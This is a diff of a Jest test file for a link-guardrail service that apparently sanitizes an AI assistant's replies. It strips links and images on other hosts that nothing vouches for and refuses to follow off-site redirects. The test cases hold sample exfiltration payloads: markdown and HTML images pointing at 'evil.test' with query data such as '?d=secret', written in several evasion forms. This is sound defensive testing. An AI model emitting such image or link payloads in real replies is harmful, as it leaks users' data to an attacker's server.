@@ -10,7 +10,10 @@ jest.mock("dns/promises", () => ({
   __esModule: true,
   default: { lookup: (h: string) => lookup(h) },
 }));
-jest.mock("@server/utils/ssrf", () => ({ validateUrlForSSRF: async () => undefined }));
+jest.mock("@server/utils/ssrf", () => ({
+  validateUrlForSSRF: async () => undefined,
+  safeFetch: (url: string, init: RequestInit) => global.fetch(url, init),
+}));
 
 import {
   LinkGuardrailService,
@@ -18,6 +21,8 @@ import {
   clearLinkStatusCache,
   extractUrls,
   normalizeUrl,
+  removeLinks,
+  sanitizeOutboundReply,
   type LinkStatus,
 } from "../../services/core/link-guardrail.service";
 
@@ -78,16 +83,36 @@ describe("LinkGuardrailService.assessLinks", () => {
     const bad = await service.assessLinks({
       response: "Go to [sales](https://shop.com/sales)",
       contextTexts: [],
+      website: "shop.com",
     });
     expect(bad).toEqual([{ url: "https://shop.com/sales", reason: "dead" }]);
   });
 
-  it("lets unknown status pass (sites that block bots)", async () => {
+  it("lets an own-site page with unknown status pass (sites that block bots)", async () => {
     const bad = await service.assessLinks({
-      response: "See https://other.com/page",
+      response: "See https://shop.com/page",
       contextTexts: [],
+      website: "shop.com",
     });
     expect(bad).toEqual([]);
+  });
+
+  it("flags another host's link without requesting it", async () => {
+    const bad = await service.assessLinks({
+      response: "See https://other.com/page?d=order-1234",
+      contextTexts: [],
+      website: "shop.com",
+    });
+    expect(bad).toEqual([{ url: "https://other.com/page?d=order-1234", reason: "unverified" }]);
+    expect(check).not.toHaveBeenCalled();
+  });
+
+  it("does not treat a known URL with a changed query as known", async () => {
+    const bad = await service.assessLinks({
+      response: "See https://other.com/page?d=secret",
+      contextTexts: ["Source: https://other.com/page"],
+    });
+    expect(bad).toEqual([{ url: "https://other.com/page?d=secret", reason: "unverified" }]);
   });
 
   it("flags a live own-site page missing from the site index", async () => {
@@ -120,6 +145,102 @@ describe("LinkGuardrailService.assessLinks", () => {
     });
     expect(bad).toEqual([]);
     expect(check).not.toHaveBeenCalled();
+  });
+});
+
+describe("removeLinks", () => {
+  it("keeps a markdown link's label and removes a bare URL", () => {
+    expect(
+      removeLinks("Read [the guide](https://x.io/a) or https://x.io/b today", [
+        "https://x.io/a",
+        "https://x.io/b",
+      ]),
+    ).toBe("Read the guide or today");
+  });
+
+  it("removes a reference definition", () => {
+    expect(removeLinks("See [a][1]\n\n[1]: https://x.io/a", ["https://x.io/a"])).toBe("See [a][1]");
+  });
+});
+
+describe("sanitizeOutboundReply", () => {
+  const base = { contextTexts: [], toolResultTexts: [], website: "shop.com" };
+
+  it.each([
+    ["inline", "Look ![x](https://evil.test/p.png?d=secret) here"],
+    ["titled", 'Look ![x](https://evil.test/p.png "t") here'],
+    ["nested alt", "Look ![a[b]c](https://evil.test/p.png) here"],
+    ["escaped alt", "Look ![a\\]b](https://evil.test/p.png) here"],
+    ["protocol-relative", "Look ![x](//evil.test/p.png) here"],
+    ["reference", "Look ![x][1] here\n\n[1]: https://evil.test/p.png"],
+    ["shortcut", "Look ![x] here\n\n[x]: https://evil.test/p.png"],
+    ["html", 'Look <img src="https://evil.test/p.png"> here'],
+    ["html unterminated", 'Look <img src="https://evil.test/p.png'],
+  ])("removes a %s image from another host", (_name, response) => {
+    const result = sanitizeOutboundReply({ ...base, response });
+    expect(result.text).not.toContain("evil.test");
+    expect(result.approvedImages).toEqual([]);
+    expect(result.removedImages.length).toBeGreaterThan(0);
+  });
+
+  it("keeps an image on the organization's site or subdomain", () => {
+    const response = "![a](https://cdn.shop.com/a.png) ![b](https://shop.com/b.png)";
+    const result = sanitizeOutboundReply({ ...base, response });
+    expect(result.text).toBe(response);
+    expect(result.approvedImages).toEqual(["https://cdn.shop.com/a.png", "https://shop.com/b.png"]);
+  });
+
+  it("keeps an image a tool returned this turn, word for word", () => {
+    const url = "https://cdn.vendor.test/p.jpg?v=12";
+    const result = sanitizeOutboundReply({
+      ...base,
+      response: `![p](${url})`,
+      contextTexts: [JSON.stringify({ image: url })],
+      toolResultTexts: [JSON.stringify({ image: url })],
+    });
+    expect(result.approvedImages).toEqual([url]);
+    expect(result.text).toContain(url);
+  });
+
+  it("removes a tool's image when the model changed its query", () => {
+    const result = sanitizeOutboundReply({
+      ...base,
+      response: "![p](https://cdn.vendor.test/p.jpg?d=secret)",
+      toolResultTexts: ["https://cdn.vendor.test/p.jpg"],
+    });
+    expect(result.approvedImages).toEqual([]);
+    expect(result.text).toBe("");
+  });
+
+  it("does not trust an image that only appears in a document or customer message", () => {
+    const url = "https://evil.test/p.png";
+    const result = sanitizeOutboundReply({
+      ...base,
+      response: `![p](${url})`,
+      contextTexts: [url],
+    });
+    expect(result.approvedImages).toEqual([]);
+  });
+
+  it("removes other hosts' links nothing vouches for and leaves known ones", () => {
+    const result = sanitizeOutboundReply({
+      ...base,
+      response:
+        "See [known](https://docs.test/a), [bad](https://evil.test/?d=1), https://shop.com/x",
+      contextTexts: ["https://docs.test/a"],
+    });
+    expect(result.text).toBe("See [known](https://docs.test/a), bad, https://shop.com/x");
+    expect(result.removedLinks).toEqual(["https://evil.test/?d=1"]);
+  });
+
+  it("removes every unverified image and link when the context is empty", () => {
+    const result = sanitizeOutboundReply({
+      response: "![a](https://shop.com/a.png) [b](https://shop.com/b)",
+      contextTexts: [],
+      toolResultTexts: [],
+    });
+    expect(result.approvedImages).toEqual([]);
+    expect(result.text).toBe("b");
   });
 });
 
@@ -177,6 +298,12 @@ describe("checkLink", () => {
 
     fetchMock.mockResolvedValueOnce(res(302, { location: "https://www.shop.com/" }));
     expect(await checkLink("https://shop.com/missing")).toBe("dead");
+  });
+
+  it("does not follow a redirect off the site", async () => {
+    fetchMock.mockResolvedValueOnce(res(302, { location: "https://elsewhere.test/page" }));
+    await expect(checkLink("https://shop.com/leaves")).resolves.toBe("unknown");
+    expect(fetchMock).toHaveBeenCalledTimes(1);
   });
 
   it("caches results", async () => {
